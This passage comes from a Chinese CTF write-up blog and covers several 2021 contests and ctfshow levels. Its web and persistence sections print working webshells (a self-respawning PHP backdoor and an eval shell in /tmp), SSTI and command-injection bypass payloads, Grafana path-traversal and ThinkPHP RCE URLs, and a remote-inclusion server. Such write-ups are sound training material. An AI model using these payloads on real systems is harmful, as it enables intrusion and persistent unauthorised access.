9A AA F0 9F 8C AA F0 9F 92 B5 F0 9F 9A A8 E2 8C A8 F0 9F 98 81 F0 9F 94 AA E2 9C 96 F0 9F 8E 88 F0 9F 8C 8F F0 9F 94 84 F0 9F 96 90 F0 9F A6 93 F0 9F 8C 8F F0 9F 95 B9 F0 9F 98 8D F0 9F 91 8C F0 9F 8C 89 F0 9F 92 B5 F0 9F 8F 8E F0 9F 9A AB F0 9F A4 A3 F0 9F 96 90 F0 9F 92 A7 F0 9F 8D 8D F0 9F 8C BF F0 9F 98 8D F0 9F 8D 8E F0 9F 9A A8 F0 9F 90 8E F0 9F 92 B5 F0 9F 8C BF F0 9F 8F B9 F0 9F 8E 85 F0 9F 99 83 F0 9F 91 91 F0 9F 98 86 E2 98 83 F0 9F 90 85 F0 9F 95 B9 F0 9F 98 87 F0 9F 8F B9 F0 9F 8F B9 F0 9F 8D B5 F0 9F 8E 88 F0 9F 8D 8E F0 9F A4 A3 F0 9F 98 81 F0 9F 8D 8D F0 9F 9A A8 F0 9F 8F B9 F0 9F 91 A3 F0 9F 94 84 F0 9F A4 A3 F0 9F 8E 88 F0 9F 98 82 F0 9F 90 8D E2 9C 85 F0 9F 98 80  E2 9C 85 F0 9F 9A AA F0 9F 98 8E F0 9F 98 80 F0 9F 97 92 F0 9F 97 92\n```\nhex转字符\n```\n🙃💵🌿🎤🚪🌏🐎🥋🚫😆✅😀🤣⌨🐍☀🥋😆🙃🎃🐘🍍☂🚪🌪💵🚨⌨😁🔪✖🎈🌏🔄🖐🦓🌏🕹😍👌🌉💵🏎🚫🤣🖐💧🍍🌿😍🍎🚨🐎💵🌿🏹🎅🙃👑😆☃🐅🕹😇🏹🏹🍵🎈🍎🤣😁🍍🚨🏹👣🔄🤣🎈😂🐍✅😀✅🚪😎😀🗒🗒\n```\nemoji-aes,加上密钥\n解出：flag{AES_1s_Gr3atS0_y0u_L1ke_1t_V3ry_Much}\n\n## questionnaire ##\n问卷调查，答案分别为\n```\nNaijing University of Aeronautics and Astronautics\n都缺\nAsuri\n航空航天民航\n智周万物,道济天下\n辅导员审核\n将军路校区\n```\nasuri{baigei_h4ve_funnnn}\n\n\n## 我们生活在南京（一）——穿越时空的电波 ##\naudacity反转音频，会听到一些英语单词，根据无线电英语字母发音表来写\n\n![](/img/wp/2021/2021nuaa-5.png)\n\n`RADIOWAVESACROSSTIME`\n\n## Try2FindMe ##\n\n比赛的时候用剑龙一直报错，加上快结束了，就没往下看\n结束后看了wp才知道是`magic number`的问题\n赛后复现：\n\n下载得到一个压缩包，binwalk分离出一个压缩包，解压得到一个pyc文件\n反编译pyc文件\n```python\nfrom Crypto.Cipher import AES\nimport binascii\n\ndef decrypt(x, cipher):\n    key = x + 'n0lve3t6r1s'\n\n    try:\n        aes = AES.new(key.rjust(24, 'A'), AES.MODE_ECB)\n        cipher = binascii.unhexlify(cipher)\n        flag = aes.decrypt(cipher).decode()\n        return flag\n        return ''\n        return None\n\n\n\ndef main():\n    c = '29426dfee9b0f158983ad996b0b7a25e3fdf85c3df187b697e3b639c64f452f21c95a941542aa530199083baf296d805'\n    k = input('Please input your key: ')\n    flag = decrypt(k, c)\n    if 'flag' in flag:\n        print('Wow, you find it!!!')\n    else:\n        print('Oh no!!!')\n\nif __name__ == '__main__':\n    main()\n```\n一个AES加密，但是少了13位密钥\n\n题目给出的hint：`pyc 隐写 python 3.7.11`\npyc隐写，先在github上下载[剑龙](https://github.com/AngelKitty/stegosaurus)\n\n但是剑龙有几个坑要注意：\n1：要用python3.6运行脚本\n2：python3.6以下magic number是12个字节；python3.7以上是16个字节\n\n因为github上下载的脚本默认是使用`12`个字节解密，但是题目中是python3.7的环境，所以当时一直报错\n我们需要将脚本中第123行的`header = f.read(12)`改为`header = f.read(16)`\n![](/img/wp/2021/2021nuaa-6.jpg)\n\n运行脚本，得到缺少的密钥`k5fgb2eur5sty`\n![](/img/wp/2021/2021nuaa-7.jpg)\n\n\n但是在脚本中解密AES是失败的，出题人给出的解释是`最后的 AES 跑不出来可能是 python 依赖版本不一样导致锅了，问题不大，找个在线的 AES 解密就行`\n\n![](/img/wp/2021/2021nuaa-8.jpg)\n\n# crypto #\n## checkin ##\n简单写个脚本\n```python\nd='oclz{loovyd_vb_l_bvnucd_hqpumj}'\ne=''\nfor i in d:\n    if i  in \"{}\":\n        continue\n    for j in range(26):\n            if ((j*11)%26)==(ord(i)-97):\n                    e=e+chr(96+j)\n                    print(e)\n                    break\n```\n![](/img/wp/2021/2021nuaa-9.png)\n最后结果加上下划线\n\n## easyRSA ##\n\n先提取c1、c2\n```python\nc2 = int(open('flag.enc2', 'rb').read().hex(), 16)\nc1 = int(open('flag.enc1', 'rb').read().hex(), 16)\nprint(c1)\nprint(c2)\n```\n\n共模攻击脚本：\n```python\nfrom libnum import n2s,s2n\nfrom gmpy2 import invert\ndef egcd(a, b):\n  if a == 0:\n    return (b, 0, 1)\n  else:\n    g, y, x = egcd(b % a, a)\n    return (g, x - (b // a) * y, y)\ndef main():\n  n = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L\n  c1 = 409050138400231971554294088177137255457866075540394361465618420085942037334914972271553348781734546381272987423855027216175678797436131073306888763180501523905135583905144901381224572922542735812959826069495112995911282269377230245515683164143316763758642080370867274365360647518283349684822272605576874844625387807047876206532634507258565110299247417968586498427727688356287596783690957837504438650897148190345700044861267114786057049491164836631033845216983588558199652913012590435836646957168387808248342739079479547784004511726635639407815336376908051269831834833967007931321906512831272657668494512124731674031937509111585885992978363095964860952405173714000880231608814695517820595229454266690556749667796735461828114590568954658520700475934939183919597602772428393159957171678913035977611490511885932486154785287709132255326686398261542844030065556598666191350007752712425713619749771672365637485154754564779267050928584728661807027994863116745339833084769533981399300503220638563466169390183736267153617583845250415885823024980144631079997094009230377992595577328633292390530018606442243369688905175147209020920954422003555782869268678894916106413862664953146515732785804502660407314901808581405034432308726147933849979689989\n  c2 = 660786051824910230873884600744959030265388429192727951166721113879854464522389325739802703310913732902833778034401632628938144275110259033918655077691853918758634982899427693594671785857857909036915654998761013827868199342737749405352507276436866364180154665315956829382533710951839019853169966694154970158966072113917267296101513243808003273019100867933714599898053661451818477001562112853209154906322205083636027498233807131522283087979547271774312067398759611022191882371123084261761098923994873110788704960182273817371315264655632343946622563006808101322364265578490109714246148052618988958628592753911496921563155003551926547472410642201974274781280633708636309449501619866376422440041537758514811836133804597783256003504933767151921016752120604258580059668650713822253122650687275054081288622996628277268146723350191531420962242602380839728712825405572549099787290957348706683963946075215806340393267714297975946671488782713260980129229158285210722045502442378445134853897763065681974592818004420357542042894544487694477937617156099760573978759048442186633017206146993595028297257148566673402976005517349438948032707348011387517929999285636559431700923275025083662201127580201286747957827301089492530820945594666308738557238429\n  e1 = 17\n  e2 = 65537\n  s = egcd(e1, e2)\n  s1 = s[1]\n  s2 = s[2]\n  if s1<0:\n    s1 = - s1\n    c1 = invert(c1, n)\n  elif s2<0:\n    s2 = - s2\n    c2 = invert(c2, n)\n  m = pow(c1,s1,n)*pow(c2,s2,n) % n\n  print n2s(m)\nif __name__ == '__main__':\n  main()\n```\n\n\n# reverse #\n## IDA Start ##\n\nida64打开，shift+F12\n\nflag{St4rt_t0_u3e_IDA}\n\n\n## Warm up ##\nIDA分析\nmain函数里面有异或\n![](/img/wp/2021/2021nuaa-10.png)\n\n然后main函数中先使用某个函数调用了另一个函数\n![](/img/wp/2021/2021nuaa-11.png)\n\n这个函数中也存在异或\n![](/img/wp/2021/2021nuaa-12.png)\n\n脚本解密\n```python\nkey=[ 0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46,0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C,0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43,0x2B, 0x26, 0x89, 0xFE]\nstr=\"qasxcytgsasxcvrefghnrfghnjedfgbhn\\x00\"\nprint(len(str))\nstr2=[0]*34\nfor i in range(0,34):\n    str2[i]=key[i]^(2*i+65)\nflag=''\nprint(str2)\nfor i in range(34):\n    flag+=chr(str2[i]^ord(str[i]))\nprint(flag)\n```\n\n\n\n# pwn #\n## format ##\n通过分析发现flag 放在buf指向的地址处\n![](/img/wp/2021/2021nuaa-13.png)\n\n获取`format`的偏移 然后计算出`buf`的偏移\n```python\nfrom pwn import *\nimport time\nn=1\nwhile 1:\n\ttry:\n\t\tp=process('format')\n\t\tp.sendline('aaaa%'+str(n)+'$p')\n\t\tp.readuntil('aaaa')\n\t\td=p.read()\n\t\tif '61616161' in d:\n\t\t\tprint(n,d)\n\t\t\tbreak\n\t\tprint(d)\n\texcept:\n\t\tpass\n\tn=n+1\n```\n![](/img/wp/2021/2021nuaa-14.png)\n使用`%7$s`获取buf指向的地址处储存的数据\n```python\nfrom pwn import *\nimport time\nn=8\np=remote(\"118.195.147.196\",9185)\np.sendline(\"%7$s\")\np.interactive()\n```\n![](/img/wp/2021/2021nuaa-15.png)\n\n\n\n## thread ##\n顶级非预期\n1111111111131111111311121131114瞎按\n录了视频\n![](/img/wp/2021/2021nuaa-16.png)\n\n\n\n\n# web #\n## 真的签到 ##\n\n百度到`CVE-2021-43798`\npayload:`/public/plugins/welcome/../../../../../../../../home/grafana/flag`\n\n![](/img/wp/2021/2021nuaa-17.png)\n\n\n## baby_python ##\n前端应该做处理了看不见回显，使用BurpSuite\n\n传入`{{self}}`，返回模板数据\n\n![](/img/wp/2021/2021nuaa-18.png)\n\n常规了`self.__class__.__base__.__subclasses__()`\n\n![](/img/wp/2021/2021nuaa-19.png)\n\n查看type类的初始化方法，传入`{{self.__class__.__base__.__subclasses__()[0].__init__}}`：\n\n![](/img/wp/2021/2021nuaa-20.png)\n\n后面就是常规payload了，跑一下ls有文件名就直接获取了\n\n```\n?name={{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('flllll11111114aaaaaggggggggggggg').read()}}\n```\n\n[参考文章](https://www.aisoutu.com/a/345834)\n\n\n## Twister ##\nF12看到一个文件`f111444g.php`\n![](/img/wp/2021/2021nuaa-21.png)\n访问，请求头里直接就是flag\n![](/img/wp/2021/2021nuaa-22.png)","tags":["wp","2021竞赛","nuaa"],"categories":["wp"]},{"title":"【ctfshow】web入门-权限维持","url":"/posts/55be078a/","content":"\n\n# WEB670-WEB676 #\n这几题做法都一样\n发现`/var/www/html`目录可写，既然是权限维持，那么直接传不死马\n\n```php\n<?php\nset_time_limit(0);\nignore_user_abort(1);\nunlink(__FILE__);\nwhile (1) {\n$content = '<?php @eval($_POST[\"shell\"]) ?>';\nfile_put_contents(\".bk.php\", $content);\nusleep(10000);\n}\n?>\n```\n访问一次不死马，会发现目录下生成了`.bk.php`\n然后check，我推测这个check应该只是删除了当前目录的所有文件，并没有其他操作\n因为我们的马是不断生成的，所以依旧可以访问\n这样就拿到了这个靶机的权限和flag\n\n\n# WEB677-WEB678 #\n\n发现没有权限写入文件\n实在没招了，在g4👴那里学了一招\n```php\nsystem('while true;do cat /f*;done');\n```\n\n在一个窗口发送后进程会锁死，另一个窗口check\n第一个窗口就会不断返回flag\n\n原理大概是因为不杀进程，所以用死循环一直cat flag\n\n\n# WEB679 #\n\n在可写的/tmp目录下传木马并写系统命令，然后提交5秒内进⾏check，check会关闭nginx和php-fpm，由于是www-data权限，⽆法启动nginx和php-fpm，直接启动php内置服务器即可\n```\ncmd=file_put_contents(\"/tmp/index.php\",\"<?php eval(\\$_POST['a']);?>\");system(\"sleep 5 && php -S 0.0.0.0:80 -t /tmp/\");\n```\n注意特殊字符编码\n传入后可以在蚁剑看看有没有成功写入php\n![](/img/ctfshow/web入门/权限维持1.png)\nflag在根目录\n（出现`Notice: Undefined index: a in /tmp/index.php on line 1`是正常情况）\n![](/img/ctfshow/web入门/权限维持2.png)","tags":["wp","ctfshow-web入门"],"categories":["wp"]},{"title":"首届安徽省“追日杯”大学生网络安全挑战赛-wp","url":"/posts/45427b40/","content":"\n混了个三等奖，奖状至今未发（主办方跑路了。。。）\n\n# MISC #\n## checkin ##\nflag{welcome_to_zrb@2021}\n\n## 阵法的奥秘 ##\n提示是8进制，观察到最后的数字是变化的\n```\nPING zrb.edisec.net: 56 data bytes\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.77 ms\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.78 ms\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.83 ms\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.77 ms\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.81 ms\n64 bytes from zrb.edisec.net: icmp_seq=3 ttl=51 time=97.81 ms\n...\n略\n```\n先提取出来\n与最小的76取余后转字符串\n最后两层base64\n```python\nimport base64\na=[77,78,83,77,81,81,76,82,77,76,82,80,77,80,77,77,76,82,77,81,83,77,83,78,77,80,80,77,76,82,77,81,76,77,80,77,77,78,82,77,76,81,77,79,78,77,82,77,77,79,77,77,81,78,77,77,77,77,83,76,77,80,78,77,76,82,77,80,83,77,83,76,77,78,81,77,81,82,77,79,78,77,79,77,77,77,81,76,82,77,77,77,78,77,82,82,77,78,80,77,78,80,77,76,81,76,82,81,77,78,78,77,76,83,77,77,77,77,83,77,77,77,81,77,79,76,77,80,80,77,80,77,77,78,83,77,76,82,77,76,82,76,82,80,77,79,78,77,76,81,77,80,80,77,82,78,77,80,80,76,82,78,77,77,78,77,82,76,77,78,78,77,81,78,77,81,79,76,83,81]\nd=''\nfor i in a:\n    d=d+str(i%76)\ne=''\nfor i in range(0,len(d),3):\n    e=e+chr(int(d[i:i+3],8))\nz=base64.b64decode(e)\nz=base64.b64decode(z)\nprint(z)\n```\n\n\n## 偷走的flag ##\n解压得到`这是一个地址.txt`和`纸条.rar`\n\n>小明去食堂吃饭，为了能在吃饭的时候有座位，他把自己的耳机和手机充电器放在桌子上。买饭回来后发现自己的东西不见了。以为被收走了。就去失物招领处询问。询问无果后，在QQ空间发现自己被挂了，说自己给学校丢人，用充电器占座，并把充电器放到了指定位置。小明找到以后发现了一串密文，只有解开密文，才能找到充电器的位置。你能帮助小明发现充电器被藏到哪里了吗。\n>密文如下：%E2%A1%96%E2%A1%9C%E2%A1%91%E2%A1%97%E2%A1%8B%E2%A1%B1%E2%A1%83%E2%A0%81%E2%A1%94%E2%A1%95%E2%A1%AF%E2%A1%B6%E2%A1%82%E2%A1%9F%E2%A1%9D%E2%A1%AF%E2%A1%99%E2%A1%9D%E2%A1%80%E2%A1%9C%E2%A1%95%E2%A1%9D%3D\n\n\n很明显的url编码，解密后得到`⡖⡜⡑⡗⡋⡱⡃⠁⡔⡕⡯⡶⡂⡟⡝⡯⡙⡝⡀⡜⡕⡝=`\n盲文编码，[在线解密](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen)得到`flag{As1de_From_implem`\n\n用这个作为压缩包密码解压\n\n>恭喜你帮助小明找到充电器。但是他的耳机也不见了。通过查询监控发现耳机与充电器一起被拿走了。当他发现耳机时，只剩下一个进水的耳机、一摊水渍和一个被揉搓了好几遍的纸条，上面字迹已经被污染了，但隐约写着：********-I_forg1ve_y0u}。你能帮助小明发现被隐藏的字样吗。\n\nvim中看到`U+202C`等字符，为0宽加密\n解密得到`3ntat1on`\n\n最后拼接在一起，注意别把0宽字符复制进去\n`flag{As1de_From_implem3ntat1on-I_forg1ve_y0u}`\n\n\n## chess ##\n全自动解密脚本\n最后一关手动解即可\n```python\n# -- coding=utf8 --\nfrom pwn import *\nio=remote(\"ctf.zrb.edisec.net\",33741)\nwin_data=''\nif __name__ == '__main__':\n\tn=0\n\tl=[[0]*3]*3\n\twhile 1:\n\t\tif '499/500' in win_data :\n\t\t\tp.interactive()\n\t\ttry:\n\t\t\tio.sendlineafter('x/y:>','2/2')\n\t\t\tob=io.recvuntil('computer:>',timeout=0.2)\n\t\t\t#ob=io.recvuntil('player:>',timeout=2)\n\t\t\t#ob=io.recvuntil(str('player:>',timeout=2))\n\t\t\t#ob=io.recvuntil(str('player:>',timeout=2)).strip()\n\t\t\tob=io.recvuntil('player:>',timeout=0.2).decode('utf-8')\n\t\t\tob=ob.strip()\n\t\t\t#ob=ob.split('/n')\n\t\t\tob=ob.split('\\n')\n\t\t\t#ob=ob.split('|')\n\t\t\tob1=ob[0].split('|')\n\t\t\tob2=ob[4].split('|')\n\t\t\tif '#' in ob1[0] or '#' in ob2[2]:\n\t\t\t\tio.send(b'1/2\\n')\n\t\t\t\tio.sendlineafter('x/y:>',b'3/2')\n\t\t\telse:\n\t\t\t\tio.send(b'2/1\\n')\n\t\t\t\tio.sendlineafter('x/y:>',b'2/3')\n\t\t\ttry:\n\t\t\t\tob=io.recvuntil('Can you win',timeout=0.2)\n\t\t\t\tif not ob:\n\t\t\t\t\traise Exception(\"123\")\n\t\t\t\twin_data=io.recvuntil('*****').decode('utf-8')\n\t\t\texcept:\n\t\t\t\ttry:\n\t\t\t\t\tio.send(b'1/1\\n')\n\t\t\t\t\tob1=io.recvuntil('repeat',timeout=0.2)\n\t\t\t\t\tif not ob1:\n\t\t\t\t\t\traise Exception(\"123\")\n\t\t\t\t\tio.send(b'1/3\\n')\n\t\t\t\t\tio.sned(b'3/1\\n')\n\t\t\t\texcept:\n\t\t\t\t\ttry:\n\t\t\t\t\t\tio.send(b'3/3\\n')\n\t\t\t\t\t\tob=io.recvuntil('Can you win',timeout=0.2)\n\t\t\t\t\t\tif not ob:\n\t\t\t\t\t\t\traise Exception(\"123\")\n\t\t\t\t\t\twin_data=io.recvuntil('*****').decode('utf-8')\n\t\t\t\t\texcept:\n\t\t\t\t\t\t#io.interactive()\n\t\t\t\t\t\tcode=0\n\t\t\t\t\t\tfor i in range(1,4):\n\t\t\t\t\t\t\tif code:\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\tfor j in range(1,4):\n\t\t\t\t\t\t\t\ttry:\n\t\t\t\t\t\t\t\t\tio.send('%s/%s\\n'%(i,j))\n\t\t\t\t\t\t\t\t\tob=io.recvuntil('Can you win',timeout=0.2)\n\t\t\t\t\t\t\t\t\tif not ob:\n\t\t\t\t\t\t\t\t\t\traise Exception(\"123\")\n\t\t\t\t\t\t\t\t\tcode=1\n\t\t\t\t\t\t\t\t\twin_data=io.recvuntil('*****').decode('utf-8')\n\t\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\t\t\texcept:\n\t\t\t\t\t\t\t\t\tpass\n\t\t\t\t\telse:\n\t\t\t\t\t\tprint(\"第四层发送2/3，接收win正常\")\n\t\t\t\telse:\n\t\t\t\t\tprint(\"第三层接收repeat和发送正常\")\n\t\t\tprint(\"第二层接收win正常\")\n\t\texcept Exception as e:\n\t\t\tif 'of range' not in e.args[0]:\n\t\t\t\tio.interactive()\n\t\telse:\n\t\t\tprint(\"成功\")\n\tio.interactive()\n```\n\n![](/img/wp/2021/2021zhuiribei-1.jpg)\n\n\n# WEB #\n## gotofly ##\n观察重定向\n看运气出flag\n![](/img/wp/2021/2021zhuiribei-2.jpg)\n\n## 2_let_me_rce ##\n```php\n<?php\nhighlight_file(__FILE__);\n$cmd=$_GET['cmd'];\nif(!preg_match('/sys|pass|exe|file|inc|cat| |\\$|\\?|\\*|more|ca\\t|nl|#| |[\\x0a]|php|perl|dir|rm|ls|sleep|cut|sh|bash|grep|ash|nc|ping|curl|cat|tac|od|more|less|nl|vi|unique|head|tail|sort|rev|string|find|\\$|\\(\\|\\)|\\[|\\]|\\{|\\}|\\>|\\<|\\?|\\*|;|\\||&|\\\\\\\\/i',$cmd)){\n    eval(\"echo '\" . $cmd .\"';\");\n}else{\n    echo \"hacker\";\n}\n?>\n```\n当时一打开就被这过滤吓住了，随便试了下就放弃了，赛后想想应该坚持一下，不要放弃\n看了wp学到了很多新的知识\n比如`du`命令也能列目录，用`sed p`读文件\n\n赛后复现:\n没有过滤反引号和单双引号\n\n列目录方法1：\n先用单引号闭合，然后反引号执行命令，空格用`%09`绕过\n```\n?cmd='.`l\"\"s%09/`.'\n```\n\n列目录方法2：\n使用`du -a /`命令\n```\n?cmd='.`du%09-a%09/`.'\n```\n\n读文件方法1：\n原理与列目录方法1一致\n```\n?cmd='.`ta\"\"c%09/cccccreal_flag_here_ccccfffffffllllllllaggggg`.'\n```\n\n读文件方法2：\n使用`sed p`命令\n```\n?cmd='.`sed%09p%09/cccccreal_flag_here_ccccfffffffllllllllaggggg%09`.'\n```\n\n## 伊泽瑞尔的php ##\n\n赛后复现\nWHT战队的exp\n```python\nimport requests\nimport zlib\nimport re\nimport base64\n\ndef x(t,k):\n  return ''.join([chr(ord(x)^ord(y)) for x,y in zip(t,k*(len(t)/len(k)+1))])\n\nsession = requests.Session()\n# @eval(@gzuncompress(@x(@base64_decode($m[1]),$k)));\ncmd = 'system(\"cat /flag\");'\ncmd = zlib.compress(cmd)\ncmd = x(cmd,\"25ed1bcb\")\ncmd = base64.b64encode(cmd)\n\nrawBody = \"423b0b7200f4{cmd}85fc5ff71c8e\".format(cmd=cmd)\nprint(rawBody)\nresponse = session.post(\"http://ctf.zrb.edisec.net:45140/index.php\", data=rawBody)\n\nprint(\"Response body: %s\" % response.content)\nres = re.findall(r'niGqOXD4rBhBWZ7t423b0b7200f4(.+)85fc5ff71c8e',response.content)[0]\n\n# $r=@base64_encode(@x(@gzcompress($o),$k));\nres = base64.b64decode(res)\nres = x(res,\"25ed1bcb\")\nres = zlib.decompress(res)\nprint(res)\n```\n\n\n\n# 综合渗透 #\n## 综合渗透-FLAG1 ##\nthinkphp框架\n简单一扫没有过滤且未修复漏洞\n用公开的payload打`http://82.156.76.152:8077/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls`\n","tags":["wp","2021竞赛","追日杯"],"categories":["wp"]},{"title":"【ctfshow】击剑杯-wp","url":"/posts/4da54c25/","content":"\n\n# 热身 #\n## 进群得码 ##\n群里发送 `击剑杯签到即可`\n\n## 听歌识曲 ##\n赛后问了群友，可能真的是积累与特征吧\n大概有两种方法：\n1：听歌词百度\n2：直接知道什么歌\n![](/img/ctfshow/jjb-1.png)\n答案是普京`ctfshow{Vladimir_Vladimirovich_Putin}`\n\n## 看图识码 ##\n网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码\n用二维码神器`cortexscan`逐一扫描，然后拼接在一起，就是flag啦\n![](/img/ctfshow/jjb-2.png)\n\n## 看图识妹 ##\n直接贴大佬的脚本了\n注意要下个`chromedriver.exe`\n[网址](https://chromedriver.chromium.org/home),版本要与chrome一致\n```python\nfrom time import sleep\nimport requests\nimport itertools\nfrom selenium import webdriver\n\n\ndef force_to_get_ans(session, url):\n    headers = {\n        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',\n        'Cookie': f'session={session}'}\n    for i in itertools.product(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J'], [str(n) for n in range(10)]):\n        chk = requests.post(f'{url}/check', {'meizi_id': ''.join(i)}, headers=headers).text\n        if '回答错误，轮数重新开始计算' not in chk:\n            return ''.join(i)\n\n\ndriver = webdriver.Chrome(r'chromedriver.exe')\nurl = 'http://002b1a4d-e639-4e31-b149-dd0fb39d779d.challenge.ctf.show/'\n\ndriver.get(f'{url}/start')\nn = 1\nwhile n <= 100:\n    cke = driver.get_cookie('session')\n    ans=force_to_get_ans(cke, url)\n    driver.find_element_by_name('meizi_id').send_keys(ans)\n    driver.find_element_by_xpath('/html/body/form/p[4]/button').click()\n    sleep(3)\n    n+=1s\n```\n\n\n## 见微知著 ##\n远程文件包含\n先在服务器上用flask搭建一个网页\n```python\n# coding=utf-8\n\nfrom flask import *\n\napp = Flask(__name__)\napp.secret_key = '*************************'\n\n@app.route('/',methods=['GET', 'POST'])\ndef index():\n    return \"<?php eval($_POST[1]);?>\"\n\nif __name__ == \"__main__\":\n    app.run(host='0.0.0.0',port=80,debug=True)\n```\n运行\n![](/img/ctfshow/jjb-3.png)\n\n上传一个`.user.ini`文件用来远程包含\n![](/img/ctfshow/jjb-4.png)\n\n因为加了头检测，所以需要在文件前加上`GIF89a`\n在这个环境中，点也被过滤了，所以需要将ip转为数字\n[在线转换](http://www.jsons.cn/ipnum/)\n![](/img/ctfshow/jjb-5.png)\n\n访问upload即可远程包含\n![](/img/ctfshow/jjb-6.png)\n\n# OSINT #\n\n## 英语阅读 ##\nOSINT的全称是`Open source intelligence`\n根据这个进行关键词搜索\n第一篇就是\n![](/img/ctfshow/jjb-7.png)\n开头就是人名\n![](/img/ctfshow/jjb-8.png)\nflag为`ctfshow{Bill_Donovan}`\n\n\n## 这是哪里 ##\n图片很大，将主要信息人物截图再百度搜图\n![](/img/ctfshow/jjb-9.png)\n在贴吧中得到信息`漳州市东山县黄道周公园`\n查询经纬度\n![](/img/ctfshow/jjb-10.png)\n`ctfshow{23.7353_117.5125}`\n\n## 卡鲁铁盒 ##\n谷歌搜图可以找到[原题](https://geckosint.medium.com/10-beginner-osint-ctf-solutions-ae89e557a4b)\n\n根据题目给出的[网址](https://www.track-trace.com/)搜索编号，找到港口和csc编号\n![](/img/ctfshow/jjb-11.png)\n注意名称全大写\nflag:`ctfshow{FBV854404_ROTTERDAM}`\n\n## 人家想玩嘛 ##\n>ctfshow{娱乐项目名称-当地该娱乐项目票价-订票增值税}\n\n百度识图\n得到位置为`迪拜购物中心喷泉`\n![](/img/ctfshow/jjb-12.png)\n\n通过谷歌地图可以得知附近的景点`lake fountain ride`\n![](/img/ctfshow/jjb-13.png)\n\n谷歌搜索`lake fountain ride 买票`，找到一个可能是官网的地方，标着票价`65`每人\n![](/img/ctfshow/jjb-14.png)\n\n点右边的在线购票\n得到增值税为`5%`\n![](/img/ctfshow/jjb-15.png)\n\n最后的结果要将`fountain`去掉\nflag为`ctfshow{LAKE_RIDE-65-5%}`\n\n\n## 人有点多 ##\n百度识图或者谷歌识图都可以得出地点`涩谷`，图中是涩谷的标志性街道\n谷歌地图可以得到店铺名字`BIC_CAMERA`和电话号码后四位`1111`\nBIC_CAMERA有官网，找到线路图，可以得知最近的是`副都心线`\n![](/img/ctfshow/jjb-16.png)\n\n谷歌或者wiki里都可以得到`副都心线`的编号为`F16`\n![](/img/ctfshow/jjb-17.png)\n\n其实上面的线路图已经可以看出出口是`B2`了，但是这题坑就在这里，还需要在B2前加上个`10`\n![](/img/ctfshow/jjb-18.png)\n\nflag为`ctfshow{BIC_CAMERA-1111-10B2-F16}`\n\n\n## 小城美食 ##\n>flag格式：ctfshow{X省X市X区X村X号}\n\n百度识图\n![](/img/ctfshow/jjb-19.png)\n\n关键词搜索\n![](/img/ctfshow/jjb-20.png)\n\n拼接一下，得到`浙江省衢州市柯城区龚家埠头村28号`\n![](/img/ctfshow/jjb-21.png)\n\n\n## 安装Arch ##\n>Example ctfshow{BV1GJ411x7h7}\n\n根据pdf中的几个关键信息，`白色字幕`，`虚拟机`，`安装arch`，在b站搜索arch安装，然后通过快速预览的方式粗滤查看，在细看\n得到结果\n`BV1e3411B79M`\n![](/img/ctfshow/jjb-22.png)\n\n\n\n\n# WEB #\n## 给我看看 ##\n源码\n```php\n<?php\nheader(\"Content-Type: text/html;charset=utf-8\");\nerror_reporting(0);\nrequire_once(\"flag.php\");\n\nclass whoami{\n    public $name;\n    public $your_answer;\n    public $useless;\n\n    public function __construct(){\n        $this->name='ctfshow第一深情';\n        $this->your_answer='Only you know';\n        $this->useless=\"I_love_u\";\n    }\n\n    public function __wakeup(){\n        global $flag;\n        global $you_never_know;\n        $this->name=$you_never_know;\n\n        if($this->your_answer === $this->name){\n            echo $flag;\n        }\n    }\n}\n\n$secret = $_GET['s'];\nif(isset($secret)){\n    if($secret===\"给我看看!\"){\n        extract($_POST);\n        if($secret===\"给我看看!\"){\n            die(\"<script>window.alert('这是不能说的秘密');location.href='https://www.bilibili.com/video/BV1CW411g7UF';</script>\");\n        }\n        unserialize($secret);\n    }\n}else{\n    show_source(__FILE__);\n}\n```\n简单的变量覆盖和反序列化\nexp\n```php\n<?php\n\nclass whoami{\n    public $your_answer;\n\n    public function __construct(){\n        $this->your_answer=&$this->name;\n    }\n}\n\n$a = new whoami();\necho serialize($a);\n```\n代码使用了`extract`函数，容易构成变量覆盖\n![](/img/ctfshow/jjb-23.png)\n\n## 谁是CTF之王？ 